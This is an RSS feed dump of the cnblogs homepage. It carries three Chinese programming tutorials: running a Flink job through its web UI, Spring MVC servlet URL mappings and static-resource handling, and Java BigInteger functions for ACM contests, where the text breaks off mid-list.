<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>《从0到1学习Flink》—— Flink 项目如何运行？ - zhisheng_tian</title>
<link>http://www.cnblogs.com/zhisheng/p/10326796.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zhisheng/p/10326796.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006tNbRwly1fy7f0d4kzdj30zk0jtwis.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;
&lt;p&gt;之前写了不少 Flink 文章了，也有不少 demo，但是文章写的时候都是在本地直接运行 Main 类的 main 方法，其实 Flink 是支持在 UI 上上传 Flink Job 的 jar 包，然后运行得。最开始在第一篇 &lt;a href=&quot;http://www.54tianzhisheng.cn/2018/09/18/flink-install/&quot;&gt;《从0到1学习Flink》—— Mac 上搭建 Flink 1.6.0 环境并构建运行简单程序入门&lt;/a&gt; 中其实提到过了 Flink 自带的 UI 界面，今天我们就来看看如何将我们的项目打包在这里发布运行。&lt;/p&gt;
&lt;h3 id=&quot;准备&quot;&gt;准备&lt;/h3&gt;
&lt;h4 id=&quot;编译打包&quot;&gt;编译打包&lt;/h4&gt;
&lt;p&gt;项目代码就拿我之前的文章 &lt;a href=&quot;http://www.54tianzhisheng.cn/2018/12/30/Flink-ElasticSearch-Sink/&quot;&gt;《从0到1学习Flink》—— Flink 写入数据到 ElasticSearch&lt;/a&gt; 吧，代码地址是在 GitHub 仓库地址：&lt;a href=&quot;https://github.com/zhisheng17/flink-learning/tree/master/flink-learning-connectors/flink-learning-connectors-es6&quot; class=&quot;uri&quot;&gt;https://github.com/zhisheng17/flink-learning/tree/master/flink-learning-connectors/flink-learning-connectors-es6&lt;/a&gt; ，如果感兴趣的可以直接拿来打包试试水。&lt;/p&gt;
&lt;p&gt;我们在整个项目 （flink-learning）pom.xml 所在文件夹执行以下命令打包：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;mvn clean install&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/006tNc79ly1fyw0covajbj31c00u0tl1.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后你会发现在 flink-learning-connectors-es6 的 target 目录下有 flink-learning-connectors-es6-1.0-SNAPSHOT.jar 。&lt;/p&gt;
&lt;h4 id=&quot;启动-es&quot;&gt;启动 ES&lt;/h4&gt;
&lt;p&gt;注意你的 Kafka 数据源和 ES 都已经启动好了, 清空了下 ES 目录下的 data 数据，为了就是查看是不是真的有数据存入进来了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/006tNc79ly1fyw0yfu4l4j31j00u0n2x.jpg&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;提交-jar-包&quot;&gt;提交 jar 包&lt;/h4&gt;
&lt;p&gt;将此文件提交到 Flinkserver 上，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006tNc79ly1fyw0lxdgw1j313p0u0wm3.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击下图红框中的&quot;Upload&quot;按钮：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/006tNc79ly1fyw0mvikxwj31k30u0adu.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如下图，选中刚刚上传的文件，填写类名，再点击&quot;Submit&quot;按钮即可启动 Job：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/006tNc79ly1fyw0w7d6e1j31pm0u0dns.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;查看运行结果&quot;&gt;查看运行结果&lt;/h3&gt;
&lt;p&gt;如下图，在 Overview 页面可见正在运行的任务：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws4.sinaimg.cn/large/006tNc79ly1fyw2j7idimj31e60u0aj2.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;你可以看到 Task Manager 中关于任务的 metric 数据&lt;br/&gt;、日志信息以及 Stdout 信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws4.sinaimg.cn/large/006tNc79ly1fyw2nvk6y3j31co0u0hdo.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;查看 Kibana ，此时 ES 中已经有数据了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws3.sinaimg.cn/large/006tNc79ly1fyw2oxbc27j31fw0u01bu.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以在 flink ui 界面上的 overview cancel 这个 job，那么可以看到 job 的日志：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006tNc79ly1fyw3dfaergj31e00u07wh.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws1.sinaimg.cn/large/006tNc79ly1fyw3f5alcij31i10u0dp1.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;总结&quot;&gt;总结&lt;/h3&gt;
&lt;p&gt;本篇文章写了下如何将我们的 job 编译打包并提交到 Flink 自带到 Server UI 上面去运行，也算是对前面文章的一个补充，当然了，Flink job 不仅支持这种模式的运行，它还可以运行在 K8s，Mesos，等上面，等以后我接触到再写写。&lt;/p&gt;
&lt;p&gt;本文原创地址是: &lt;a href=&quot;http://www.54tianzhisheng.cn/2019/01/05/Flink-run/&quot; class=&quot;uri&quot;&gt;http://www.54tianzhisheng.cn/2019/01/05/Flink-run/&lt;/a&gt; , 未经允许禁止转载。&lt;/p&gt;
&lt;h3 id=&quot;关注我&quot;&gt;关注我&lt;/h3&gt;
&lt;p&gt;微信公众号：&lt;strong&gt;zhisheng&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;另外我自己整理了些 Flink 的学习资料，目前已经全部放到微信公众号了。你可以加我的微信：&lt;strong&gt;zhisheng_tian&lt;/strong&gt;，然后回复关键字：&lt;strong&gt;Flink&lt;/strong&gt; 即可无条件获取到。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ws2.sinaimg.cn/large/006tNbRwly1fyh07imy15j30bq0bwq43.jpg&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;github-代码仓库&quot;&gt;Github 代码仓库&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zhisheng17/flink-learning/&quot; class=&quot;uri&quot;&gt;https://github.com/zhisheng17/flink-learning/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以后这个项目的所有代码都将放在这个仓库里，包含了自己学习 flink 的一些 demo 和博客&lt;/p&gt;
&lt;h3 id=&quot;相关文章&quot;&gt;相关文章&lt;/h3&gt;
&lt;p&gt;1、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/13/flink-introduction/&quot;&gt;《从0到1学习Flink》—— Apache Flink 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/09/18/flink-install&quot;&gt;《从0到1学习Flink》—— Mac 上搭建 Flink 1.6.0 环境并构建运行简单程序入门&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;3、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/27/flink-config/&quot;&gt;《从0到1学习Flink》—— Flink 配置文件详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;4、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/28/flink-sources/&quot;&gt;《从0到1学习Flink》—— Data Source 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/30/flink-create-source/&quot;&gt;《从0到1学习Flink》—— 如何自定义 Data Source ？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;6、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/29/flink-sink/&quot;&gt;《从0到1学习Flink》—— Data Sink 介绍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;7、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/10/31/flink-create-sink/&quot;&gt;《从0到1学习Flink》—— 如何自定义 Data Sink ？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;8、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/11/04/Flink-Data-transformation/&quot;&gt;《从0到1学习Flink》—— Flink Data transformation(转换)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;9、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/12/08/Flink-Stream-Windows/&quot;&gt;《从0到1学习Flink》—— 介绍Flink中的Stream Windows&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;10、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/12/11/Flink-time/&quot;&gt;《从0到1学习Flink》—— Flink 中的几种 Time 详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;11、&lt;a href=&quot;http://www.54tianzhisheng.cn/2018/12/30/Flink-ElasticSearch-Sink/&quot;&gt;《从0到1学习Flink》—— Flink 写入数据到 ElasticSearch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;12、&lt;a href=&quot;http://www.54tianzhisheng.cn/2019/01/05/Flink-run/&quot;&gt;《从0到1学习Flink》—— Flink 项目如何运行？&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;13、&lt;a href=&quot;http://www.54tianzhisheng.cn/2019/01/06/Flink-Kafka-sink/&quot;&gt;《从0到1学习Flink》—— Flink 写入数据到 Kafka&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 07:43:00 +0000</pubDate>
<dc:creator>zhisheng_tian</dc:creator>
<og:description>&lt;! more 前言 之前写了不少 Flink 文章了，也有不少 demo，但是文章写的时候都是在本地直接运行 Main 类的 main 方法，其实 Flink 是支持在 UI 上上传 Flink J</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/zhisheng/p/10326796.html</dc:identifier>
</item>
<item>
<title>使用框架时，在web.xml中配置servlet时，拦截请求/和/*的区别。 - 知己者智</title>
<link>http://www.cnblogs.com/CharlesKY/p/10326777.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/CharlesKY/p/10326777.html</guid>
<description>&lt;p&gt;关于servlet的拦截设置，之前看了好多，说的都不太清除，明白。&lt;/p&gt;
&lt;p&gt;最近明白了一些，总的来说就是保证拦截所有用户请求的同时，放行静态资源。&lt;/p&gt;
&lt;p&gt;现整理如下：&lt;/p&gt;



&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; 　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;　　　　org.springframework.web.context.ContextLoaderListener
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; 　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;listener&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; 　　&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; Spring MVC Servlet &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; 　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;servletName&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;　　　　org.springframework.web.servlet.DispatcherServlet
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-class&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;14&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;load-on-startup&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;15&lt;/span&gt; 　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt; 　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;18&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;servletName&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;19&lt;/span&gt; 　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;/&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt; 　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br/&gt;　　此处需要特别强调的是 &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;使用的是/，而不是/*,如果使用/*,那么请求时可以通过DispatcherServlet转发到相应的Action或者Controller中的，但是返回的内容，如返回的jsp还会再次被拦截，这样导致404错误，即访问不到jsp。所以如果以后发现总是有404错误的时候，别忘了check一下 &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;的配置是否是/*.&lt;/p&gt;


&lt;p&gt;　　例：当映射为@RequestMapping(&quot;/user/add&quot;)时&lt;/p&gt;
&lt;p&gt;&lt;br/&gt;　　1、拦截*.do、*.htm， 例如：/user/add.do&lt;/p&gt;&lt;p&gt;　　这是最传统的方式，最简单也最实用。不会导致静态文件（jpg,js,css）被拦截。&lt;/p&gt;&lt;p&gt;　　2、拦截/，例如：/user/add&lt;/p&gt;&lt;p&gt;　　可以实现现在很流行的REST风格。很多互联网类型的应用很喜欢这种风格的URL。&lt;/p&gt;&lt;p&gt;　　弊端：会导致静态文件（jpg,js,css）被拦截后不能正常显示。想实现REST风格，事情就是麻烦一些。后面有解决办法还算简单。&lt;/p&gt;&lt;p&gt;　　3、拦截/*，这是一个错误的方式，请求可以走到Action中，但转到jsp时再次被拦截，不能访问到jsp。&lt;/p&gt;


&lt;p&gt;&lt;br/&gt;　　如果你的DispatcherServlet拦截&quot;*.do&quot;这样的有后缀的URL，就不存在访问不到静态资源的问题。&lt;/p&gt;&lt;p&gt;　　如果你的DispatcherServlet拦截&quot;/&quot;，为了实现REST风格，拦截了所有的请求，那么同时对*.js,*.jpg等静态文件的访问也就被拦截了。&lt;/p&gt;&lt;p&gt;　　我们要解决这个问题。&lt;/p&gt;&lt;p&gt;　　目的：可以正常访问静态文件，不可以找不到静态文件报404。&lt;/p&gt;&lt;p&gt;　　方案一：激活Tomcat的defaultServlet来处理静态文件&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;　　&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;default&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;*.jpg&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;br/&gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;default&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;*.js&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;br/&gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;default&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-name&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;*.css&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;url-pattern&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;servlet-mapping&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br/&gt;　　特点：1. 要配置多个，每种文件配置一个。&lt;/p&gt;&lt;p&gt;　　2. 要写在DispatcherServlet的前面， 让 defaultServlet先拦截请求，这样请求就不会进入Spring了。&lt;/p&gt;&lt;p&gt;　　3. 高性能。&lt;/p&gt;&lt;p&gt;　　备注：&lt;/p&gt;&lt;p&gt;　　Tomcat, Jetty, JBoss, and GlassFish 自带的默认Servlet的名字 -- &quot;default&quot;&lt;br/&gt;　　Google App Engine 自带的 默认Servlet的名字 -- &quot;_ah_default&quot;&lt;br/&gt;　　Resin 自带的 默认Servlet的名字 -- &quot;resin-file&quot;&lt;br/&gt;　　WebLogic 自带的 默认Servlet的名字 -- &quot;FileServlet&quot;&lt;br/&gt;　　WebSphere 自带的 默认Servlet的名字 -- &quot;SimpleFileServlet&quot;&lt;/p&gt;&lt;p&gt;　　方案二： 在spring3.0.4以后版本提供了mvc:resources ， 使用方法：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
　　&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 对静态资源文件的访问 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:resources &lt;/span&gt;&lt;span&gt;mapping&lt;/span&gt;&lt;span&gt;=&quot;/images/**&quot;&lt;/span&gt;&lt;span&gt; location&lt;/span&gt;&lt;span&gt;=&quot;/images/&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br/&gt;　　images/**映射到 ResourceHttpRequestHandler进行处理，location指定静态资源的位置.可以是web application根目录下、jar包里面，这样可以把静态资源压缩到jar包中。cache-period 可以使得静态资源进行web cache&lt;/p&gt;&lt;p&gt;　　&lt;br/&gt;　　如果出现下面的错误，可能是没有配置&amp;lt;mvc:annotation-driven /&amp;gt;的原因。&lt;br/&gt;　　报错WARNING: No mapping found for HTTP request with URI [/mvc/user/findUser/lisi/770] in DispatcherServlet with name 'springMVC'&lt;/p&gt;&lt;p&gt;　　使用&amp;lt;mvc:resources/&amp;gt;元素,把mapping的URI注册到SimpleUrlHandlerMapping的urlMap中,&lt;br/&gt;　　key为mapping的URI pattern值,而value为ResourceHttpRequestHandler,&lt;br/&gt;　　这样就巧妙的把对静态资源的访问由HandlerMapping转到ResourceHttpRequestHandler处理并返回,所以就支持classpath目录,jar包内静态资源的访问.&lt;br/&gt;　　另外需要注意的一点是,不要对SimpleUrlHandlerMapping设置defaultHandler.因为对static uri的defaultHandler就是ResourceHttpRequestHandler,&lt;br/&gt;　　否则无法处理static resources request.&lt;/p&gt;&lt;p&gt;　　方案三 ，使用&amp;lt;mvc:default-servlet-handler/&amp;gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
　　&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:default-servlet-handler&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;br/&gt;　　会把&quot;/**&quot; url,注册到SimpleUrlHandlerMapping的urlMap中,把对静态资源的访问由HandlerMapping转到 org.springframework.web.servlet.resource.DefaultServletHttpRequestHandler 处理并返回.&lt;br/&gt;　　DefaultServletHttpRequestHandler使用就是各个Servlet容器自己的默认Servlet.&lt;/p&gt;&lt;p&gt;　　补充说明：多个HandlerMapping的执行顺序问题：&lt;/p&gt;&lt;p&gt;　　DefaultAnnotationHandlerMapping的order属性值是：0&lt;/p&gt;&lt;p&gt;　　&amp;lt; mvc:resources/ &amp;gt; 自动注册的 SimpleUrlHandlerMapping 的order属性值是： 2147483646&lt;/p&gt;&lt;p&gt;　　&amp;lt;mvc:default-servlet-handler/&amp;gt;自动注册 的SimpleUrlHandlerMapping 的order属性值是： 2147483647&lt;/p&gt;&lt;p&gt;　　spring会先执行order值比较小的。当访问一个a.jpg图片文件时，先通过 DefaultAnnotationHandlerMapping 来找处理器，一定是找不到的，因为我们没有叫a.jpg的Action。然后再按order值升序找，由于最后一个 SimpleUrlHandlerMapping 是匹配 &quot;/**&quot;的，所以一定会匹配上，就可以响应图片。 访问一个图片，还要走层层匹配。不知性能如何？&lt;/p&gt;&lt;p&gt;　　最后再说明一下，方案二、方案三 在访问静态资源时，如果有匹配的(近似)总拦截器，就会走拦截器。如果你在拦截中实现权限检查，要注意过滤这些对静态文件的请求。&lt;/p&gt;&lt;p&gt;　　如何你的DispatcherServlet拦截 *.do这样的URL后缀，就不存上述问题了。还是有后缀方便。&lt;/p&gt;



&lt;p&gt;以上。&lt;/p&gt;
&lt;p&gt;主要参考：https://zhidao.baidu.com/question/2055907804031398347.html&lt;/p&gt;
</description>
<pubDate>Sun, 27 Jan 2019 07:39:00 +0000</pubDate>
<dc:creator>知己者智</dc:creator>
<og:description>关于servlet的拦截设置，之前看了好多，说的都不太清除，明白。 最近明白了一些，总的来说就是保证拦截所有用户请求的同时，放行静态资源。 现整理如下： 一、我们都知道在基于Spring的Applic</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/CharlesKY/p/10326777.html</dc:identifier>
</item>
<item>
<title>ACM中java中BigInteger和Decimal用到的主要函数 - SongHL</title>
<link>http://www.cnblogs.com/songorz/p/10326634.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/songorz/p/10326634.html</guid>
<description>&lt;h2 class=&quot;md-end-block md-heading md-focus&quot;&gt;&lt;span class=&quot;md-expand&quot;&gt;java中大数以及高精度常用函数&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;使用java大数类解决问题时我们需要注意两个方面:&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;1、不能有包名，也就是说我们要把主类放到默认的包里，如果你的代码里出现形如package cn.gov.test;这样的代码你很有可能会收获到RE&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;2、提交的类的类名必须为Main，如果是其他的名字你有可能收获到CE也有可能收获到WA（例如UVA)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt; Scanner cin=new Scanner(System.in);// 读入&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;md-end-block md-heading&quot;&gt;&lt;span&gt;一.BigInteger&lt;/span&gt;&lt;/h3&gt;
&lt;pre class=&quot;md-fences md-end-block&quot;&gt;
&lt;br/&gt;&lt;span&gt;import java.math.BigInteger;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;BigInteger.ZERO //大整数0 &lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;BigInteger.ONE //大整数1 &lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;BigInteger.TEN //大整数10&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;BigInteger.valueOf(long val)//返回一个BigInteger，其值等于指定long。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger(String val) //构造 ：讲一个字符串变为BigIngeter类型的数据&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger add(BigInteger val) //普通加法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger subtract(BigInteger val)//普通减法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger multiply(BigInteger val)//普通乘法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger divide(BigInteger val)//普通除法&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger max(BigInteger val)//返回两个数中的最大值&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger min(BigInteger val)//返回两者中的最小值&lt;span class=&quot;md-line md-end-block&quot;&gt;&lt;span&gt;public BigInteger[] divideAndRemainder(BigInteger 